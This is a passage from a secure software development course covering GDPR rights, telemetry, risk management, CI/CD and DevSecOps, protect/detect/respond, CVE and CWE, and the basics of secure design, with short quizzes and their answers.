* **Right to Rectification** (Art. 16)<br>Data subjects can have inaccurate data updated and corrected.

* **Right to Erasure** (a.k.a “Right to be Forgotten”) (Art. 17)<br>In certain circumstances, data subjects can have their personal data erased.

* **Right to Restriction of Processing** (Art. 18)<br>In certain circumstances, data subjects can restrict processing of their personal data. It can still be stored, unless a “Right to Erasure” request was also made.

* **Right to Data Portability** (Art. 20)<br>In certain circumstances, data subjects can have their personal data exported (e.g., provided to the data subject or a third party in a structured, commonly used and machine-readable format).

* **Right to Object** (Art. 21)<br>In certain circumstances, particularly for direct marketing and profiling purposes, data subjects can object to having their personal data processed.

To process personal data, it must be lawful, meaning it must fall into at least one of several categories, including the following among others:

* **Compliance with Law**. Personal data can be processed if it is necessary for compliance with a legal obligation.

* **Performing a Contract with the Data Subject**. Personal data can be processed if it is necessary to perform a contract that is with that data subject. *Note that this likely does not apply to a contract with somebody other than the data subject, such as their employer.*

* **Legitimate Business Interests**. Personal data can be processed if doing so is consistent with “legitimate interests,” unless overridden by the data subject’s interests to the contrary. This can be a more ambiguous concept.

* **Consent**. Personal data can be processed if the data subject gives their consent.

Note that personal data can be processed if the data subject gives their consent. However, for consent to be valid under the GDPR:

* it must be *“specific”* and *“informed”* (e.g., it should include a specific description of what data is being collected, and how it will be used);

* it requires a *“clear affirmative action”* by the data subject (e.g., requiring the participant to check a checkbox, and not having it pre-checked); and

* it must be freely revocable (e.g., the data subject must be able to withdraw consent at any time).

Even if consent is granted, you may want to also find another lawful basis for processing the data, especially if you want to retain it. Under the GDPR, you are generally prohibited from retaining personal data without a lawful basis.

Under the GDPR, *profiling* is any form of automated processing that involves using personal data to evaluate aspects of that person. Profiling will usually require getting explicit consent from the individual, which means also that the individual will be able to withdraw that consent at any time. Therefore, profiling activities will typically require a greater degree of review and protections for the applicable personal data.

Here are some resources for learning more about the GDPR:

* The [official EU site for the GDPR text](http://data.europa.eu/eli/reg/2016/679/oj)

* [*“The Guide to the General Data Protection Regulation (GDPR)”*](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/)

* [*“Solutions for a responsible use of the blockchain in the context of personal data”*](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf)

* [*“Security of Personal Data”*](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf)

* The Linux Foundation, [*“Summary of GDPR Concepts For Free and Open Source Software Projects”*](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf)

* [California Online Privacy Protection Act, Chapter 22. Internet Privacy Requirements [22575-22579]](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575)

#### Telemetry

Software sometimes includes functionality to collect telemetry data, that is, data about how the software is used or performing. Telemetry data is often collected through a “phone home” mechanism built into the software itself, where the software sends this data elsewhere.

Telemetry data is especially fraught with privacy and confidentiality issues. End users are typically presented with an option to opt-in to share statistical data with the developers of the software, but that agreement may not be adequate. End users ideally should be given a full awareness of what data may be sent to which parties (including the vendor) when they use the software, and the ability to control that transfer of data.

The Linux Foundation’s [*“Telemetry Data Collection and Usage Policy”*](https://www.linuxfoundation.org/telemetry-data-policy/) presents a brief discussion of some of the issues that should be considered before implementing telemetry data collection, as well as discussing the Foundation’s approach to managing use of telemetry by its open source project communities. This may be useful to you in other contexts.

#### Quiz 1.3: Privacy Requirements

\>\>Which of the following privacy-related statements is true?||Check all of the options below that are true, and do NOT check them otherwise.<<

[!] There are no privacy laws in the United States. {{ selected: No. The United States does not have a *comprehensive* information privacy law as a whole. Instead, the US federal government has a number of laws that cover different specific circumstances. There are also some state laws. }}

[ ] The GDPR is irrelevant as long as you process personal data outside Europe. {{ selected: No. The GDPR applies to those processing personal data of those residing in Europe, whether or not it is processed in Europe. Failure to comply with the GDPR may or may not be enforceable depending on a variety of factors, but in many cases it is very relevant. }}

[x] Under the GDPR, some personal data is considered more sensitive, and there are greater restrictions on collecting and processing them. This includes political opinions, religious or philosophical beliefs, trade union membership, genetic data, and data concerning health.

[ ] Under the GDPR, once consent is given it cannot be withdrawn. {{ selected: No, the GDPR requires that it be possible for users to be able to revoke consent. If there is no other legal reason that the data can be retained and processed, then the data must be erased. }}

[ ] Under the GDPR, a prechecked “I agree” checkbox is enough to obtain consent. {{ selected: No, consent requires a “clear affirmative action”. Prechecked boxes do not count. }}

[x] Under the GDPR, data subjects can, under certain circumstances, demand to have their personal data erased.

## How Can We Get There?

### Risk Management

Risks are *potential problems*. The key to developing adequately secure software is to manage the risks of developing insecure software, *before* they become problems.

#### The Need for Risk Management

All of life involves risk. It is unrealistic to expect that there will be no risks in life. In particular, there are risks to anyone using the software you develop because it may have vulnerabilities. When you develop software, you are likely to make mistakes, and some of those mistakes might eventually lead to security vulnerabilities. Someone may even try to intentionally insert vulnerabilities or malicious code into your software, or the software you depend on, during its development. Even very strong techniques for countering vulnerabilities must build on assumptions or can only eliminate *some* security-related risks, so again, it is unrealistic to expect there to be no risks.

But when you develop software, you should take reasonable steps to *manage* risks so that the risks are so low (both to its developers and users) that they are acceptable. In his book, [*“The Failure of Risk Management: Why It’s Broken and How to Fix It”*](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536) (2009), Douglas Hubbard defines risk management as the *“identification, evaluation, and prioritization of risks… followed by coordinated and economical application of resources to minimize, monitor, and control the probability or impact of unfortunate events”*.

One of the risks when developing and deploying software is that attacker(s) will exploit its vulnerabilities and cause harm to others. You cannot prevent attackers from trying to attack the system. In fact:

**🚩 If people start using the software you develop, _expect_ that intelligent adversaries will try to attack it.**

While you cannot prevent attackers from attacking software, you can make it difficult for an attack to succeed, or reduce the impact if an attack succeeds. You can do this by taking steps throughout software development and deployment to reduce the risks to an acceptably low level. If your software is widely-used or depended on for vital tasks, then it is especially important that you work to manage those risks to your users.

Do *not* wait to think about risks until they happen. Then they are no longer risks - they are *problems*. It is easier and cheaper to address risks *before* they become problems! It is much easier to design the software to minimize risks than to change the software later. It is also better for the user, your professional reputation, the software's reputation, and any related organization's reputation.

#### Risk Management Process

Small projects with relatively low impacts can do risk management informally. Large projects with major impacts should be more rigorous. Regardless, risk management can be divided into the following activities (according to the US Department of Defense’s [*Risk, Issue, and Opportunity Management Guide for Defense Acquisition Programs*](http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf), 2017):

1. **Risk planning**. Determine your project’s risk management process.

2. **Risk identification**. Identify what *might* go wrong. A good trick is to look for similar projects - what risks and problems did they have? It is a good idea to write this list down so it can be shared. For our purposes, we are concerned about security-related risks.

3. **Risk analysis**. Determine the two key attributes of a risk: the **likelihood** of the undesirable event and the **severity** of its consequences. A risk becomes increasingly important if its likelihood and/or severity increases.

4. **Risk handling**. Determine what you will do about the risk. You have several options for each risk:

    1. **Acceptance (& Monitoring)**: The risk is accepted, but monitored and communicated to its stakeholders (including its users). This is reasonable if the likelihood or severity are low.

    2. **Avoidance**. The risk is eliminated by making some change. That is, you make its likelihood zero or its severity irrelevant. This is great when you can do it. For example, you might choose to *not* gather some data (then you cannot lose its confidentiality later), or you might choose a programming language where certain kinds of vulnerabilities cannot happen (eliminating the risks from those kinds of vulnerabilities).

    3. **Transfer**. The risk is transferred to someone else (e.g., buying insurance, or changing the system so that another component has that risk and its developers accept it). For example, instead of taking on the risks of bad identification & authentication (I&A), depend on some existing system to do I&A.

    4. **Control**. Actively reduce the risk to an acceptable level. Since the importance of a risk depends on its likelihood and severity, this means changing things to make the likelihood and/or severity low (or at least lower). For security-related risks, this is often what you need to do. There is no single way to do this, so instead you have to continuously reduce likelihood and severity through software development and deployment until the risks are acceptable. For example, you might:

        1. Ensure all developers know about certain kinds of common mistakes that lead to a particular kind of vulnerability (so that they can avoid them),

        2. Use approaches (such as secure design, specific programming languages, and APIs) that are designed to make those vulnerabilities less likely,

        3. Use tools & reviews to catch mistakes (including vulnerabilities), and

        4. Harden the system. Hardening a system means modifying a system so that defects are less likely to become security vulnerabilities. We will discuss hardening later in the course.

5. **Risk Monitoring**. Determine how the risks have changed over time. Over time, you should “burn down” your risks - that is, the steps you are taking should be continuously reducing the risk likelihood or severity to acceptable levels.

Risk management is *not* complicated. It is basically common sense. But when you are working on solving the current problems it is easy to forget about risks, which are only *potential* problems. A little thought *ahead* of time can eliminate potential problems before they become real problems.

#### Identifying Risks

Note that the first step (beyond planning) is identifying risks. But how do you identify the risks of security vulnerabilities? Clearly many people do *not* notice risks from security vulnerabilities.

Bruce Schneier has this wonderful story ([*The Security Mindset*](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html), 2008):

> *“Uncle Milton Industries has been selling ant farms to children since 1956. Some years ago, I remember opening one up with a friend. There were no actual ants included in the box. Instead, there was a card that you filled in with your address, and the company would mail you some ants. My friend expressed surprise that you could get ants sent to you in the mail. [Bruce Schneier] replied: ‘What’s really interesting is that these people will send a tube of live ants to anyone you tell them to.’ … Security requires a particular mindset. Security professionals -- at least the good ones -- see the world differently. They can’t walk into a store without noticing how they might shoplift. They can’t use a computer without wondering about the security vulnerabilities. They can’t vote without trying to figure out how to vote twice.”*

Can this mindset be taught? Our experience is that it can be, at least in part. Checklists, guidance, and tips help remind people to look for certain things, especially when they are built from relevant past experiences. Another technique that helps is working to develop a slightly paranoid mind-set. Not a clinical level of paranoia, but a constant low-level concern that there are many risks and that some people really are out to get you. Remember that some users will intentionally seek to cause rare, unlikely, or unexpected situations, in the hope that such attacks will give them unwarranted privileges. As a result, when writing secure programs, paranoia is a virtue. Talking about risks with others, reviewing plans with others, and continuously looking for risks can all help identify risks so that they can be addressed *before* they become problems.

#### Security Is A Process, Not A Product

In his essay, [*The Process of Security*](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html) (2000), Bruce Schneier famously explained that

> *“security is a process not a product… there’s no such thing as perfect security. Interestingly enough, that’s not necessarily a problem. … Security does not have to be perfect, but the risks have to be manageable…”.*

The world changes. The ways your software is used changes. New vulnerabilities are discovered. The software’s platform and libraries change. Laws, company policies, and goals change. Software that was secure a year or five years ago may not be adequate today.

Since security is a process, it is not just “fire and forget.” You need to continuously consider security.

#### Checklists Are Not Security

Do not equate checklists, guidelines, and tips with security. They are often *useful*, because they can help you identify risks and reasonable ways to handle them. Good checklists, guidelines, and tips can save you a lot of time and trouble, and they are also great aids for helping others evaluate the security of some software. Good ones are built on the experience of others, and you’d be foolish to ignore that experience.

But they are only aids to the real goal; they are not the goal itself. You can follow checklists, guidelines, and tips, and have terribly insecure software. You can also *disregard* some inappropriate ones and have very secure software. In short:

**_There is no substitute for thinking._**

This course will give you a number of tips to help you to reduce risks, focusing on lessons that previous developers have learned. But they are merely tips; they are merely an *aid* to developing secure software. When you are developing software, continuously think about the ways that an attacker might try to exploit your system. Anticipate the potential problems—while they are still risks—and mitigate them.

#### Quiz 1.4: Risk Management

\>\>The purpose of developing secure software is to eliminate all possible security risks. True or False?<<

( ) True

(x) False

[Explanation]

This is false. It would be great if we could eliminate all risks, But that is unreasonable. Instead, our goal is to reduce the probability and severity of all risks, including security vulnerabilities, to acceptable levels.

[Explanation]

### Development Processes / Defense-in-Breadth

There is no single magic mechanism to make secure software. Instead, you have to continuously consider security throughout software development and deployment. Considering security at all times, through all development and deployment processes, is sometimes called “defense in breadth”. So let’s talk about the processes used for software development and deployment.

#### Individual Software Development & Deployment Processes

Whenever you develop software there are certain processes that all developers have to do. These include:

* Determine *requirements* (what the software must do). For security, make sure you know what security requirements it needs to provide. For example, is there data it should keep confidential?

* Determine *architectural design* (how to divide up the problem into interacting components to solve it). Later in this course we will discuss various secure design principles to help you design a system that is easier to secure.

* *Select reusable components* (decide what reusable packages/libraries you will use). You need to evaluate the components you will use, since any of their vulnerabilities may become vulnerabilities of the software you are developing. These reused components come from somewhere, and depend transitively on other components. The set of all those dependencies, including where they come from and how they eventually get to you, is your *supply chain*.

* *Implement* it (write the code). Most security vulnerabilities made during implementation are specific common kinds; once you know what they are, you can avoid them.

* *Verify* it (write/implement tests and use analyzers to gain confidence that it does what it is supposed to). You should be testing to make sure that your system is secure, and using tools to help you find vulnerabilities before attackers find them.

* *Deploy* it. You should help ensure that users can get the correct version, that it is secure by default, and that they can easily operate it in a secure way.

#### Using These Processes Together

Of course, you need to use these processes together.

A common mistake is trying to execute these software development processes in a strict sequence (figure out all the requirements, then work out the entire design, then implement the entire system, then verify it). Attempting to create software in this strict sequence is called the *waterfall* model. The waterfall model is beguiling because doing these processes in strict sequence *appears* rigorous and sensible at first. In 1970, Winston W. Royce explained in his essay [*Managing the Development of Large Systems: Concepts and Techniques*](https://dl.acm.org/doi/10.5555/41765.41801) why trying to follow these processes in a strict sequence (a “waterfall”) is extremely risky in most circumstances and should normally be avoided.

Another common mistake is to implement software components independently and never integrate and test them together until everything is completed independently. This is typically a mistake, because this leads to serious problems getting the components to work together.

In practice, most software development executes these processes in parallel, bouncing information between the processes as new information is learned. There are many ways to combine processes, which depend on many factors such as the size of the team and how reliable the result needs to be. There are many different different approaches, including the many different Agile, incremental, evolutionary, and waterfall development approaches. For purposes of this course, we will focus on security aspects whenever you choose to apply some process, and not much on these specifics. So you can apply this course’s materials regardless of the approach you use. However, let’s look at a few specific practices and terms that can be important for security.

A highly recommended practice is to use Continuous Integration (CI), the practice of frequently merging working copies of development into a shared mainline (e.g., once every few days through many times a day). This routine merging reduces the risks of components not working together if integration was delayed until later, and that is a good thing. However, successful CI requires a way to determine if the components are actually working together. This is resolved by using a CI pipeline—a process that runs whenever something is merged to ensure that it builds and passes a set of automated tests and other checks.

Many organizations want to deploy software/services more rapidly, and have adopted various approaches to do that building on these standard software development processes. Definitions vary, but here are some common terms:

* Continuous Delivery (CD or CDE) aims to ensure *“an application is always at production-ready state after successfully passing automated tests and quality checks [by employing practices] to deliver software automatically to a production-like environment”* (Mojtaba Shahin, Muhammad Ali Babar, and Liming Zhu, [*Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*](https://arxiv.org/abs/1703.07019), 2017). Note that the software is not necessarily released or deployed without a separate approval step.

* Continuous Deployment (CD) *“goes a step further [than continuous delivery] and automatically and continuously deploys the application to production or customer environments”* (Mojtaba Shahin, Muhammad Ali Babar, and Liming Zhu, [*Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*](https://arxiv.org/abs/1703.07019), 2017).

* DevOps focuses on coordination and cooperation between the software development (Dev) and IT operations (Ops) teams (Mike Loukides, [*Revisiting “What Is DevOps”*](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html), 2014), e.g., to shorten development and deployment time. In practice, this typically includes Continuous Delivery (CDE) and may include Continuous Deployment (CD).

* DevSecOps (also called SecDevOps) is DevOps, but specifically integrating security concerns into the development and operations process (Red Hat, [*What Is DevSecOps?*](https://www.redhat.com/en/topics/devops/what-is-devsecops))

* GitOps "is a way of implementing Continuous Deployment for cloud native applications. It focuses on a developer-centric experience when operating infrastructure, by using tools developers are already familiar with, including Git and Continuous Deployment tools.  The core idea of GitOps is having a Git repository that always contains declarative descriptions of the infrastructure currently desired in the production environment and an automated process to make the production environment match the described state in the repository. If you want to deploy a new application or update an existing one, you only need to update the repository - the automated process handles everything else" per <https://www.gitops.tech/>. Similar definitions are "GitOps uses Git repositories as a single source of truth to deliver infrastructure as code." (Red Hat, [*What Is GitOps?*](https://www.redhat.com/en/topics/devops/what-is-gitops)) and "GitOps is an operational framework that takes DevOps best practices used for application development such as version control, collaboration, compliance, and CI/CD, and applies them to infrastructure automation." (GitLab, [*What is GitOps?*](https://about.gitlab.com/topics/gitops/)).

All these depend on automated tests and quality checks, and from a security perspective, what is critical is that tools to check for security vulnerabilities and potential security issues need to be integrated into those automated tests and quality checks. For example, you should ensure that tools are in your CI pipeline that check for various security issues, so that any security problems are detected early. Security tools that take a long time to run might be run in parallel but be used as a “gate” for CDE. We will discuss much more about tools to support security later in the course.

Simply inserting some “security tools” into an automated test suite, by itself, tends to be ineffective. Security tools will not generally know what the software is supposed to do (the requirements). For example, security tools will not know what information is confidential. Security tools usually cannot detect fundamental problems in the software design, and even if they could, fixing design problems is not what detection tools do.  Security tools often miss vulnerabilities, especially if the software is poorly designed. And perhaps most importantly, information from security tools generally do not make sense to developers if they do not have a basic understanding about security. There is an old phrase that is still true: *“a fool with a tool is still a fool”*.

**In short:** Tools are important, but not enough. You must continuously consider security throughout development and deployment, no matter what you are doing, so you can identify and handle security-related risks. Consider how your system might be attacked (identifying its risks), analyze risks to determine how likely the system could be exploited and the severity if it was, and then decide what to do. That definitely includes adding security tools in your continuous integration pipeline, but those tools will be far more effective if you think about security throughout development and deployment. In the rest of this course we will cover how to do that. We will eventually discuss tools, but only after we understand what the tools are helping us do.

You also should focus on continuous improvement, of both the software itself and the processes you use to develop it. If the current design or API is hard to use securely, make it easy to use securely. Look for ways to harden the software against attacks. Modify the verification processes by adding new tools, or changing the configuration of existing tools, to increasingly detect problems before they are released to users.

#### Quiz 1.5: Development Processes / Defense-in-Breadth

\>\>To develop secure software, you should always rigorously develop all the requirements, then develop your complete design, and only then begin implementing the software. True or False?<<

( ) True

(x) False

[Explanation]

This is false. This is a “waterfall” approach and is generally a very risky way to develop software. You need an idea of what you are trying to achieve, of course, but reality is more complex: as you design, implement, and field, you will get feedback into what the requirements really *should* be.

[Explanation]

#### Quiz 1.6: Development Processes / Defense-in-Breadth

\>\>To develop secure software, simply add security tools into your continuous integration pipeline. True or False?<<

( ) True

(x) False

[Explanation]

This is false, but it is a sneaky question because there is a grain of truth in it.

It is important to have security tools in your continuous integration pipeline. No matter how good your design and implementation approach is, you will make mistakes, and tools in the continuous integration pipeline will help you find some of those mistakes.

But simply “adding security tools” is not enough. No tool can fix a bad design, and tools will miss implementation vulnerabilities. You must think about security no matter what you are doing during development and operations.

[Explanation]

### Protect, Detect, Respond

Software is developed to be used, so let’s briefly look at security from the viewpoint of operations.

Organizations should not assume that they can always protect their systems from attack. Attackers sometimes break through. For example, the [US NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) identifies five concurrent and continuous functions organizations should apply in their operations to manage cybersecurity risk:

1. **Identify**<br>*“Develop an organizational understanding to manage cybersecurity risk to systems, people, assets, data, and capabilities”.*

2. **Protect**<br>*“Develop and implement appropriate safeguards to **ensure** delivery of critical services”.*

3. **Detect**<br>*“Develop and implement appropriate activities to identify the occurrence of a cybersecurity event”.*

4. **Respond**<br>“Develop and implement appropriate activities to take action regarding a detected cybersecurity incident”.

5. **Recover**<br>*“Develop and implement appropriate activities to maintain plans for resilience and to restore any capabilities or services that were impaired due to a cybersecurity incident”.*

This list of five functions is sometimes simplified to three basic functions: **protect**, **detect**, and **respond**. When using this simplified list of three basic functions, identify is considered part of protect, and recover is considered part of respond. We will use that shortened list of basic functions here.

None of these three basic functions (protect, detect, and respond) is effective by itself. If you only protect, but don’t detect or recover, then an attacker who breaks through your defenses can do whatever they want. If you only detect or recover, without protecting your system, you will never get any work done; you will instead spend all your time on detection or recovery, and soon no one will trust your system. In addition, recovery is useless without detection, because you often won’t know *when* to recover.

We will talk a lot about protection measures. It is typically cheaper to prevent problems than deal with them later (old proverbs apply here, e.g., *“an ounce of prevention is worth a pound of cure”*). But we will also discuss measures to detect and respond, because they are also necessary. At the very least, larger applications should include mechanisms like logging (to support detection) and backup (to support recovery), because they are necessary in applications we deploy.

#### Quiz 1.7: Protect, Detect, Respond

\>\>Choose the correct answer.<<

(!) Protection is what matters in security; if your protection is good enough, you don’t need detection or response. {{No, because there is always the possibility of an unanticipated mistake.}}

( ) Response is what matters in security; you can never protect everything anyway, so just focus on response. {{No, because without good protection you will be overwhelmed with problems.}}

(x) You need protection, detection, and response in security.

### Vulnerabilities

A vulnerability is simply a failure to meet some security requirement. Typically vulnerabilities are unintentional, but vulnerabilities can be intentional. For example, someone may have intentionally inserted malicious code (or at least attempted to do so) in the software you reuse or develop, such as a backdoor (a way to gain unauthorized access) or a logic bomb (code that performs a malicious function when specified conditions are met). This course focuses strictly on software, though of course hardware can also have vulnerabilities.

Modern society depends on software (and hardware), and as a result, there has been a massive growth in the number of publicly-known vulnerabilities. This has made it difficult to answer simple questions like, *“did you fix this particular vulnerability"*? Next, we will outline some efforts that have been made to identify and address known vulnerabilities.

#### Reporting and Handling Vulnerabilities - A Brief Summary

There are many people who have, for one reason or or another, found security vulnerabilities in software. Some people, called security researchers, make finding vulnerabilities part of their career.

In most cases, these vulnerability finders report the vulnerability to the software supplier(s) through a *“timed coordinated disclosure”* process. The finders privately report the vulnerability to the supplier(s), giving the supplier(s) some limited time (called the *“embargo time”*) to fix the vulnerability. After this embargo time (typically 14-90 days), or when the vulnerability has been fixed and users have had an opportunity to install the upgraded version of the software, the vulnerability is publicly disclosed. Sometimes this process is just called *“coordinated disclosure”*, but we want to make it unambiguously clear that in this process, the vulnerability will be publicly disclosed if the supplier fails to fix it in a timely manner.

In practice, things are more complicated. Often there are multiple suppliers and other stakeholders involved. It is critically important that you (as a developer/supplier) prepare ahead-of-time so that people can easily report vulnerabilities to you, so that you can privately discuss the issue with trusted parties, and so that you can rapidly fix any issues. Later in this course we will further discuss how to accept and report vulnerabilities, including references to useful documents about it. In addition, there is so much software and so many vulnerabilities that there is a need to track vulnerabilities. This need for tracking led to the creation of something called Common Vulnerabilities and Exposures (CVE).

#### CVEs

Common Vulnerabilities and Exposures (CVE) is a global dictionary of (some) publicly disclosed cybersecurity vulnerabilities. The goal of CVE is to make it easier to share data about vulnerabilities. A CVE entry has an identification number (ID), description, and at least one public reference. CVE IDs have the form CVE-*year*-*number*, where *year* is the year it was reported and *number* is an arbitrary positive integer to ensure that CVE IDs are unique. For example, [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160) is a specific vulnerability in OpenSSL (called the Heartbleed  vulnerability) that was first reported in 2014. There are databases, such as the [US National Vulnerability Database (](https://nvd.nist.gov/)[NVD](https://nvd.nist.gov/)[)](https://nvd.nist.gov/), that track the current public set of CVE entries.

CVEs are assigned by a CVE Numbering Authority (CNA). A CNA is simply an organization authorized to assign CVE IDs to vulnerabilities affecting products within some scope defined in advance. The primary CNA (aka “CNA of last resort”) can assign a CVE even if no one else can (this role is currently filled by [MITRE](https://www.mitre.org/)). Many CNAs are software product developers (such as Microsoft and Red Hat) who assign CVE numbers for their own products. There are also third-party coordinators for vulnerabilities, such as the [CERT Coordination Center](https://sei.cmu.edu/about/divisions/cert/index.cfm), who are CNAs. Each CNA is given a block of integers that it can use in CVEs. This means that CVE-2025-50000 does not mean that it is vulnerability number 50,000 in the year 2025, but merely that the CNA who assigned that CVE ID was authorized to assign 50,000 in the year 2025.

Many publicly-known vulnerabilities do not have CVE assignments. First of all, CVEs are only assigned if someone requests an assignment from a CNA; if no request is made, there will be no CVE. In addition, CVEs are intentionally limited in scope. CVEs are only granted for software that has been publicly released (including pre-releases if they are widely used). CVEs are generally not assigned to custom-built software that is not distributed. They are also not normally assigned to online services. That said, CVEs are the most widely used method for giving a unique identifier for each publicly-known vulnerability, so it is important to know about them.

#### Top Kinds of Vulnerabilities

The vast majority of vulnerabilities can be grouped into categories. That turns out to be very useful; once we identify categories, we can determine which ones are common and what steps we can take to prevent those kinds of vulnerabilities from happening again.

The [Common Weaknesses Enumeration (CWE)](https://cwe.mitre.org/) is a very long list of common weaknesses. In their terminology, a “weakness” is a category (type) of vulnerability. Note the difference between CVE and CWE:  a CWE identifies a *type* of vulnerability, while a CVE identifies a *specific* vulnerability in a particular (family of) products. Each CWE has an identifier with a number, e.g., CWE-20. We will mention CWE from time to time. However, the CWE is a large list, and we cannot cover all CWEs in this course.

People have identified the most important or top kinds of vulnerabilities in terms of their likelihood and severity. Two of the most popular lists of top kinds of vulnerabilities are:

1. [**OWASP Top 10**](https://owasp.org/www-project-top-ten/)<br>This list, developed by the Open Web Application Security Project (OWASP), represents a *“broad consensus about the most critical security risks to web applications.”* It is also called the OWASP Top 10 Web Application Security Risks.

2. [**CWE Top 25 List**](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html)<br>This is a list of the most widespread and critical kinds of vulnerabilities. It was created by the Common Weaknesses Enumeration (CWE) Team by analyzing data about publicly-known vulnerabilities over many years. This list can be applied to any software, but it is especially common to apply it to software that is not a web application (since the OWASP list focuses on web applications). One interesting quirk: they identify important weaknesses beyond the first 25, so you can see numbers larger than 25 associated with this list.

OWASP has other top 10 lists for different kinds of software. For example:

* [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/) - the mobile applications top 10

* [OWASP Internet of Things Project](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project) - the Internet of Things (IoT) top 10.

That said, the web application top 10 list is the best known top 10 list from OWASP.

These top vulnerabilities are not only common, but they tend to result in severe vulnerabilities.



These top lists do change over time. Unfortunately, they do not change very much. Many of the top vulnerabilities in the CWE Top 25 have been the same common kinds of vulnerabilities for decades (e.g., see *Computer Security Technology Planning Study*, [volume I](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf) and [volume II](https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf), by James P. Anderson, 1972), and most of the top web application problems have been common kinds of web application vulnerabilities since the 1990s. So while things do change, learning about the *top* kinds of vulnerabilities will be helpful to you for years to come.

In various places throughout the course you will see the alarm bell symbol 🔔. This symbol indicates that the vulnerabilities being discussed are so common that they are in the OWASP top 10 web application security risk list and/or the CWE top 25 list.

#### Value of Knowing Top Kinds of Vulnerabilities

We will spend a lot of time in this course reviewing common kinds of vulnerabilities. The risk of doing this is that you may think that is all there is to developing secure software. This is not true.

Avoiding common mistakes is **_not_** enough, by itself, to make software secure.

But depending on how you measure things, anywhere from 90% to 99% or more vulnerabilities are covered by these top lists. By preventing common mistakes, you will reduce the number of vulnerabilities by at least an order of magnitude! That makes knowing - and countering - common kinds of vulnerabilities very valuable, because it will make your software much more secure. Saying *never make a mistake* is impractical. In contrast, it is practical to focus on identifying and managing the most common kinds of mistakes that lead to vulnerabilities. Part of the reason that these vulnerabilities are common is that most developers do not know what they are; knowing what they are is the first step to managing them.

Identifying common kinds of vulnerabilities has another advantage, too: It will help you identify *other* kinds of vulnerabilities. As we have already noted, there is no substitute for thinking. But many developers find it challenging to view their systems like an attacker would. By looking at common kinds of vulnerabilities of the past, you can become more sensitive to vulnerabilities in general. So while knowing common kinds of vulnerabilities does not *replace* thinking, knowing them can *help* you think.

#### Quiz 1.8: Vulnerabilities

\>\>Choose the true statement.<<

(!) All publicly-known vulnerabilities are assigned CVE IDs. {{No, someone has to request a CVE ID. In addition, CVEs are only granted for software that has been publicly released (including pre-releases if they are widely used). CVEs are generally not assigned to custom-built software that is not distributed. They are also not normally assigned to online services.}}

( ) All CVEs are assigned by the MITRE Corporation. {{No, CVEs are assigned by a “CVE Numbering Authority” (CNA.)}}

(x) Avoiding common kinds of vulnerabilities is not enough by itself to make software secure, but it can be a significant help.

# Design

This chapter describes how to design software to be secure, focusing on key secure design principles such as least privilege, complete mediation, and input validation.

Learning objectives:

1. Explain what secure design principles are and provide examples of some key widely-accepted principles.

2. Discuss the concept of least privilege.

3. Discuss complete mediation (“non-bypassability”), including common mistakes.

4. Understand input validation on an environment you can trust.

5. Discuss other widely-accepted secure design principles, particularly those identified by Saltzer and Schroeder.

## Secure Design Basics

### What Are Security Design Principles?

When you write non-trivial software, you have to break the problem into smaller components that work together. This process of deciding how to break a problem into components and how they will work together is called *design* or *architectural design*. For example, you are designing when you are trying to decide how to break a problem into a particular set of classes and methods. The result of those decisions is also called a design or architectural design. The word “design” is also used to describe user interface design, but that is not the sense we mean here.

Remember that the design process, like any other software development process, doesn’t happen just once. It is really common to try to implement some software, realize that the design doesn’t work, and then change the design. You often have to change a design when you change what the software does. So the design process happens whenever you think about changing how to break the problem down in your software.

Some designs are better than others: some are easier to maintain, faster, and so on. In particular, some designs are more secure than other designs. There is no magic trick that guarantees that your design is secure. But people have been developing software for decades, and through experience, they have identified a set of *design principles* that can help you choose good designs over bad ones.

Design principles are broadly accurate guides based on experience and practice. Put another way, design principles are rules of thumb for helping you quickly avoid a bad design and guiding you to a good design instead. Secure design principles do not guarantee security, though; they are an aid to thinking, not a replacement for thinking. For example, sometimes a principle will not apply at all. Sometimes principles clash; for example, one secure design principle is keeping things simple, but sometimes you need more complexity to get something else done. In rarer cases, there may be good reasons from a security point of view to even completely violate a principle. That said, your software will generally be more secure if you think about secure design principles and try to apply them. Secure design principles are distilled wisdom, and you would be wise to consider them.

When thinking about your design, you need to think about what components you can trust (and how much), and what components you cannot necessarily trust. Some design principles talk about a *trust boundary*. The trust boundary is simply the boundary between the components you trust and the components you do not necessarily trust. Where the trust boundary is depends on what software you are developing:

* If you are writing a server-side application, you presumably trust what you are running on (e.g., the computer, operating system, and container runtime if there), but not the external client systems (some of which might be controlled by an attacker). The trust boundary is between the server and the clients.

* If you are writing a mobile (smartphone) application that talks to a server you control, you presumably trust that remote server. You should not trust the communication path between your mobile application and server (so you will want to use TLS to encrypt it). You certainly should not trust other applications on the smartphone, unless you have special reason to trust one. So clearly, there is a boundary between your mobile application and (1) the general Internet and (2) other mobile applications. Trust is often not absolute; you probably trust that the mobile smartphone operating system will run for that user, but that user might be an attacker, so you should probably ensure that some secrets never get into the mobile application at all.

#### Quiz 2.1: What Are Security Design Principles?

\>\>If you follow secure design principles, you will always create secure software. True or False?<<

(!) True

(x) False

[Explanation]

Sadly, following secure design principles does not guarantee secure software. Instead, they are a merely valuable guide to that path. You still need to *think*.

[Explanation]

### Widely-Recommended Secure Design Principles

